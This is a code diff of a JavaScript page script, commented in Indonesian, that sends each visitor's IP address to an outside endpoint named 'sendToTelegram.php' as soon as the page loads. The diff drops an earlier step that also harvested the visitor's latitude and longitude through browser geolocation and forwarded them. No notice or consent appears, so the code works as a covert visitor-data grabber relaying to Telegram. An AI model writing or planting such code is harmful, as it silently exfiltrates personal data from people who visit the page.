@@ -58,33 +58,11 @@ async function getIPAddress() {
   return data.ip;
 }
 
-// Mengambil Lokasi Pengguna
-function getLocation(ipAddress) {
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(
-      async function (position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-
-        // Kirim data ke backend
-        sendToBackend(ipAddress, latitude, longitude);
-      },
-      function (error) {
-        console.error("Error mendapatkan lokasi: ", error.message);
-      }
-    );
-  } else {
-    console.error("Geolocation tidak didukung oleh browser ini.");
-  }
-}
-
-// Mengirim Data ke Backend
-async function sendToBackend(ip, lat, long) {
+// Mengirimkan Data IP ke Backend
+async function sendToBackend(ip) {
   const backendUrl = "https://hell0w0rld.my.id/sendToTelegram.php"; // Ganti dengan URL endpoint backend Anda
   const messageData = {
     ip: ip,
-    latitude: lat,
-    longitude: long,
   };
 
   try {
@@ -105,9 +83,8 @@ async function sendToBackend(ip, lat, long) {
 window.onload = async function () {
   try {
     const ip = await getIPAddress();
-    getLocation(ip);
+    sendToBackend(ip);  // Hanya kirimkan IP ke backend
   } catch (err) {
     console.error("Gagal mengambil data: ", err.message);
   }
 };
-
